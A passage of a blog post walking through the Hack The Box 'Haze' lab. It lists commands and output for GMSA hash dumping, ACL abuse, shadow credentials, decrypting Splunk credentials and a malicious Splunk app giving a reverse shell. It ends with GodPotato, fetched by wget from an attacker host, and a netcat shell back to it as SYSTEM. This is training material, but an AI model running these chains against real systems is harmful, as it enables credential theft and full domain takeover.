+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bloodyAD --host 10.129.232.50 -d haze.htb -u mark.adams -p &#x27;Ld@p_Auth_Sp1unk@2k24&#x27; get writable --detail --otype COMPUTER</span><br></pre></td></tr></table></figure>
+
+<p>Output:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">distinguishedName: CN=Haze-IT-Backup,CN=Managed Service Accounts,DC=haze,DC=htb</span><br><span class="line">msDS-GroupMSAMembership: WRITE</span><br></pre></td></tr></table></figure>
+
+<h3 id="Modifying-GMSA-Permissions"><a href="#Modifying-GMSA-Permissions" class="headerlink" title="Modifying GMSA Permissions"></a>Modifying GMSA Permissions</h3><p>To retrieve the GMSA password, we need to add Mark.Adams to the <code>PrincipalsAllowedToRetrieveManagedPassword</code> attribute. This can be done using PowerShell or BloodyAD.</p>
+<p><strong>PowerShell Method (from a Windows machine with AD module):</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Set-ADServiceAccount -Identity Haze-IT-Backup -PrincipalsAllowedToRetrieveManagedPassword mark.adams</span><br><span class="line"></span><br><span class="line">Get-ADServiceAccount -Identity Haze-IT-Backup -Properties * | select PrincipalsAllowedToRetrieveManagedPassword</span><br></pre></td></tr></table></figure>
+
+<h3 id="Dumping-the-GMSA-Hash"><a href="#Dumping-the-GMSA-Hash" class="headerlink" title="Dumping the GMSA Hash"></a>Dumping the GMSA Hash</h3><p>Now we can retrieve the GMSA password hash:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netexec ldap dc01.haze.htb -u mark.adams -p &#x27;Ld@p_Auth_Sp1unk@2k24&#x27; --gmsa</span><br></pre></td></tr></table></figure>
+
+<p><strong>Result:</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Haze-IT-Backup$ : c79d47f871571938274edccebaf91db6</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Haze/gmsa-dump.png" alt="GMSA Dump Success"></p>
+<hr>
+<h2 id="Lateral-Movement-Edward-Martin"><a href="#Lateral-Movement-Edward-Martin" class="headerlink" title="Lateral Movement - Edward.Martin"></a>Lateral Movement - Edward.Martin</h2><h3 id="Analyzing-Haze-IT-Backup-Permissions"><a href="#Analyzing-Haze-IT-Backup-Permissions" class="headerlink" title="Analyzing Haze-IT-Backup$ Permissions"></a>Analyzing Haze-IT-Backup$ Permissions</h3><p>With the GMSA credentials, let’s check what privileges this account has in BloodHound:</p>
+<p><img src="/images/Haze/forcechange.png" alt="Force Change Password Privilege"></p>
+<p>The <strong>Haze-IT-Backup$</strong> account has <strong>ForceChangePassword</strong> rights over <strong>edward.martin</strong> through the <strong>Support_Services</strong> group membership.</p>
+<h3 id="Abusing-Group-Membership"><a href="#Abusing-Group-Membership" class="headerlink" title="Abusing Group Membership"></a>Abusing Group Membership</h3><p><strong>Step 1: Take Ownership of Support_Services Group</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">owneredit.py -action write -new-owner &#x27;Haze-IT-Backup$&#x27; -target-dn &#x27;CN=SUPPORT_SERVICES,CN=USERS,DC=HAZE,DC=HTB&#x27; &#x27;haze.htb&#x27;/&#x27;Haze-IT-Backup$&#x27; -dc-ip 10.129.232.50 -hashes :c79d47f871571938274edccebaf91db6</span><br></pre></td></tr></table></figure>
+
+<p><strong>Step 2: Grant WriteMembers Permission to Ourselves</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dacledit.py -action write -rights WriteMembers -principal &#x27;Haze-IT-Backup$&#x27; -target Support_Services haze.htb/&#x27;Haze-IT-Backup$&#x27; -hashes :c79d47f871571938274edccebaf91db6</span><br></pre></td></tr></table></figure>
+
+<p><strong>Step 3: Add Haze-IT-Backup$ to Support_Services Group</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bloodyAD --host 10.129.232.50 -d haze.htb -u &#x27;Haze-IT-Backup$&#x27; -p :c79d47f871571938274edccebaf91db6 add groupMember Support_Services &#x27;Haze-IT-Backup$&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><strong>Step 4: Attempt Password Change</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bloodyAD --host 10.129.232.50 -d haze.htb -u &#x27;Haze-IT-Backup$&#x27; -p :c79d47f871571938274edccebaf91db6 set password edward.martin &#x27;HelloWorld!&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><strong>Error Encountered:</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Password can&#x27;t be changed before -2 days, 23:55:00.698064 because of the minimum password age policy.</span><br></pre></td></tr></table></figure>
+
+<h3 id="Shadow-Credentials-Attack"><a href="#Shadow-Credentials-Attack" class="headerlink" title="Shadow Credentials Attack"></a>Shadow Credentials Attack</h3><p>Since we cannot change the password due to the minimum password age policy, we’ll abuse the <strong>AddKeyCredentialLink</strong> permission using Shadow Credentials:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bloodyAD --host 10.129.232.50 -d haze.htb -u &#x27;Haze-IT-Backup$&#x27; -p :c79d47f871571938274edccebaf91db6 add shadowCredentials edward.martin</span><br></pre></td></tr></table></figure>
+
+<p><strong>Recovered NT Hash:</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">edward.martin : 09e0b3eeb2e7a6b0d419e9ff8f4d91af</span><br></pre></td></tr></table></figure>
+
+<h3 id="Accessing-Backup-Files"><a href="#Accessing-Backup-Files" class="headerlink" title="Accessing Backup Files"></a>Accessing Backup Files</h3><p>With Edward.Martin’s credentials, we gain access to the <strong>Backups</strong> share containing a Splunk backup file:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">download splunk_backup_2024-08-06.zip</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Haze/access-backups.png" alt="Access to Backups Share"></p>
+<hr>
+<h2 id="Splunk-Backup-Analysis"><a href="#Splunk-Backup-Analysis" class="headerlink" title="Splunk Backup Analysis"></a>Splunk Backup Analysis</h2><h3 id="Extracting-Credentials"><a href="#Extracting-Credentials" class="headerlink" title="Extracting Credentials"></a>Extracting Credentials</h3><p>Unzip the backup file:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">unzip splunk_backup_2024-08-06.zip</span><br></pre></td></tr></table></figure>
+
+<p><strong>Locate Authentication Configuration:</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Splunk/var/run/splunk/confsnapshot/baseline_local/system/local$ cat authentication.conf</span><br></pre></td></tr></table></figure>
+
+<p><strong>Contents:</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bindDN = CN=alexander.green,CN=Users,DC=haze,DC=htb</span><br><span class="line">bindDNpassword = $1$YDz8WfhoCWmf6aTRkA+QqUI=</span><br></pre></td></tr></table></figure>
+
+<p><strong>Retrieve Splunk Secret:</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Splunk/etc/auth$ cat splunk.secret</span><br></pre></td></tr></table></figure>
+
+<p><strong>Decrypt Alexander.Green’s Password:</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">splunksecrets splunk-decrypt -S secret_spunk2</span><br><span class="line">Ciphertext: $1$YDz8WfhoCWmf6aTRkA+QqUI=</span><br><span class="line">Sp1unkadmin@2k24</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="Gaining-Administrator-Access"><a href="#Gaining-Administrator-Access" class="headerlink" title="Gaining Administrator Access"></a>Gaining Administrator Access</h2><h3 id="Splunk-Admin-Access"><a href="#Splunk-Admin-Access" class="headerlink" title="Splunk Admin Access"></a>Splunk Admin Access</h3><p>The recovered credentials work for the Splunk <strong>admin</strong> user. With admin access to Splunk, we can deploy a malicious Splunk app for remote code execution.</p>
+<h3 id="Creating-Malicious-Splunk-App"><a href="#Creating-Malicious-Splunk-App" class="headerlink" title="Creating Malicious Splunk App"></a>Creating Malicious Splunk App</h3><p>Using the reverse shell Splunk app from: <a target="_blank" rel="noopener" href="https://github.com/0xjpuff/reverse_shell_splunk">https://github.com/0xjpuff/reverse_shell_splunk</a></p>
+<p><strong>Step 1: Edit the Reverse Shell Script</strong></p>
+<p>Modify <code>bin/run.ps1</code> to include your attacker IP and port 443.</p>
+<p><strong>Step 2: Package the App</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tar -cvzf panos.tgz reverse_shell_splunk</span><br><span class="line">mv panos.tgz panos.spl</span><br></pre></td></tr></table></figure>
+
+<p><strong>Step 3: Upload and Install</strong></p>
+<p>Navigate to <strong>Apps &gt; Manage Apps</strong> and select “Install an app from a File”</p>
+<p><img src="/images/Haze/apps.png" alt="Splunk Apps Management"></p>
+<p>Upload the malicious <code>.spl</code> file and trigger it to receive a reverse shell as <strong>alexander.green</strong>.</p>
+<hr>
+<h2 id="Privilege-Escalation-to-SYSTEM"><a href="#Privilege-Escalation-to-SYSTEM" class="headerlink" title="Privilege Escalation to SYSTEM"></a>Privilege Escalation to SYSTEM</h2><h3 id="SeImpersonatePrivilege-Abuse"><a href="#SeImpersonatePrivilege-Abuse" class="headerlink" title="SeImpersonatePrivilege Abuse"></a>SeImpersonatePrivilege Abuse</h3><p>Checking privileges of the alexander.green shell reveals <strong>SeImpersonatePrivilege</strong>:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whoami /priv</span><br></pre></td></tr></table></figure>
+
+<p>We’ll abuse this using <strong>GodPotato</strong>: <a target="_blank" rel="noopener" href="https://github.com/BeichenDream/GodPotato/releases/tag/V1.20">https://github.com/BeichenDream/GodPotato/releases/tag/V1.20</a></p>
+<p><strong>Download Required Files:</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http://10.10.14.68:9091/GodPotato-NET4.exe -o GodPotato-NET4.exe</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http://10.10.14.68:9091/nc64.exe -o nc64.exe</span><br></pre></td></tr></table></figure>
+
+<p><strong>Execute Netcat as SYSTEM:</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\GodPotato-NET4.exe -cmd &quot;C:\Users\alexander.green\nc64.exe 10.10.14.68 9091 -e cmd.exe&quot;</span><br></pre></td></tr></table></figure>
+
+<p>This spawns a shell as <strong>NT AUTHORITY\SYSTEM</strong>, granting full access to the domain controller and administrator files.</p>
+<hr>
+<h2 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h2><p>This walkthrough demonstrated a complete Active Directory penetration testing scenario, covering:</p>
+<ol>
+<li><strong>Initial Access</strong> via Splunk CVE-2024-36991 path traversal</li>
+<li><strong>Credential Harvesting</strong> and decryption</li>
+<li><strong>Active Directory Enumeration</strong> using BloodHound and BloodyAD</li>
+<li><strong>GMSA Abuse</strong> to gain higher privileges</li>
+<li><strong>Shadow Credentials Attack</strong> to bypass password policies</li>
+<li><strong>Lateral Movement</strong> through multiple accounts</li>
+<li><strong>Splunk Admin Exploitation</strong> for code execution</li>
+<li><strong>Privilege Escalation</strong> via SeImpersonatePrivilege</li>
+</ol>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writeups</a></li>
+        
+          <li><a href="/search/">Search</a></li>
+        
+          <li><a href="/tags/">tags</a></li>
+        
+          <li><a target="_blank" rel="noopener" href="https://github.com/PanosoikoGr">Projects</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#HTB-Haze-Complete-Penetration-Testing-Walkthrough"><span class="toc-number">1.</span> <span class="toc-text">HTB Haze - Complete Penetration Testing Walkthrough</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Introduction"><span class="toc-number">1.1.</span> <span class="toc-text">Introduction</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Initial-Reconnaissance"><span class="toc-number">1.2.</span> <span class="toc-text">Initial Reconnaissance</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Nmap-Scan-Results"><span class="toc-number">1.2.1.</span> <span class="toc-text">Nmap Scan Results</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Enumeration"><span class="toc-number">1.3.</span> <span class="toc-text">Enumeration</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Splunk-Web-Interface-Port-8000"><span class="toc-number">1.3.1.</span> <span class="toc-text">Splunk Web Interface (Port 8000)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CVE-2024-36991-Splunk-Path-Traversal"><span class="toc-number">1.3.2.</span> <span class="toc-text">CVE-2024-36991 - Splunk Path Traversal</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Credential-Decryption"><span class="toc-number">1.3.3.</span> <span class="toc-text">Credential Decryption</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Active-Directory-Enumeration"><span class="toc-number">1.4.</span> <span class="toc-text">Active Directory Enumeration</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Initial-BloodHound-Collection"><span class="toc-number">1.4.1.</span> <span class="toc-text">Initial BloodHound Collection</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Adding-a-Machine-Account"><span class="toc-number">1.4.2.</span> <span class="toc-text">Adding a Machine Account</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Password-Spraying"><span class="toc-number">1.4.3.</span> <span class="toc-text">Password Spraying</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Privilege-Escalation-Mark-Adams"><span class="toc-number">1.5.</span> <span class="toc-text">Privilege Escalation - Mark.Adams</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Analyzing-BloodHound-Data"><span class="toc-number">1.5.1.</span> <span class="toc-text">Analyzing BloodHound Data</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#GMSA-Investigation"><span class="toc-number">1.5.2.</span> <span class="toc-text">GMSA Investigation</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Modifying-GMSA-Permissions"><span class="toc-number">1.5.3.</span> <span class="toc-text">Modifying GMSA Permissions</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Dumping-the-GMSA-Hash"><span class="toc-number">1.5.4.</span> <span class="toc-text">Dumping the GMSA Hash</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Lateral-Movement-Edward-Martin"><span class="toc-number">1.6.</span> <span class="toc-text">Lateral Movement - Edward.Martin</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Analyzing-Haze-IT-Backup-Permissions"><span class="toc-number">1.6.1.</span> <span class="toc-text">Analyzing Haze-IT-Backup$ Permissions</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Abusing-Group-Membership"><span class="toc-number">1.6.2.</span> <span class="toc-text">Abusing Group Membership</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Shadow-Credentials-Attack"><span class="toc-number">1.6.3.</span> <span class="toc-text">Shadow Credentials Attack</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Accessing-Backup-Files"><span class="toc-number">1.6.4.</span> <span class="toc-text">Accessing Backup Files</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Splunk-Backup-Analysis"><span class="toc-number">1.7.</span> <span class="toc-text">Splunk Backup Analysis</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Extracting-Credentials"><span class="toc-number">1.7.1.</span> <span class="toc-text">Extracting Credentials</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Gaining-Administrator-Access"><span class="toc-number">1.8.</span> <span class="toc-text">Gaining Administrator Access</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Splunk-Admin-Access"><span class="toc-number">1.8.1.</span> <span class="toc-text">Splunk Admin Access</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Creating-Malicious-Splunk-App"><span class="toc-number">1.8.2.</span> <span class="toc-text">Creating Malicious Splunk App</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Privilege-Escalation-to-SYSTEM"><span class="toc-number">1.9.</span> <span class="toc-text">Privilege Escalation to SYSTEM</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#SeImpersonatePrivilege-Abuse"><span class="toc-number">1.9.1.</span> <span class="toc-text">SeImpersonatePrivilege Abuse</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Conclusion"><span class="toc-number">1.10.</span> <span class="toc-text">Conclusion</span></a></li></ol></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://panosoikogr.github.io/2025/10/29/HTB-Haze/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://panosoikogr.github.io/2025/10/29/HTB-Haze/&text=HTB-Haze"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://panosoikogr.github.io/2025/10/29/HTB-Haze/&title=HTB-Haze"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://panosoikogr.github.io/2025/10/29/HTB-Haze/&is_video=false&description=HTB-Haze"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=HTB-Haze&body=Check out this article: https://panosoikogr.github.io/2025/10/29/HTB-Haze/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://panosoikogr.github.io/2025/10/29/HTB-Haze/&title=HTB-Haze"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://panosoikogr.github.io/2025/10/29/HTB-Haze/&title=HTB-Haze"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://panosoikogr.github.io/2025/10/29/HTB-Haze/&title=HTB-Haze"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://panosoikogr.github.io/2025/10/29/HTB-Haze/&title=HTB-Haze"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://panosoikogr.github.io/2025/10/29/HTB-Haze/&name=HTB-Haze&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://panosoikogr.github.io/2025/10/29/HTB-Haze/&t=HTB-Haze"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2024-2027
+    Panosoiko
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writeups</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/tags/">tags</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/PanosoikoGr">Projects</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
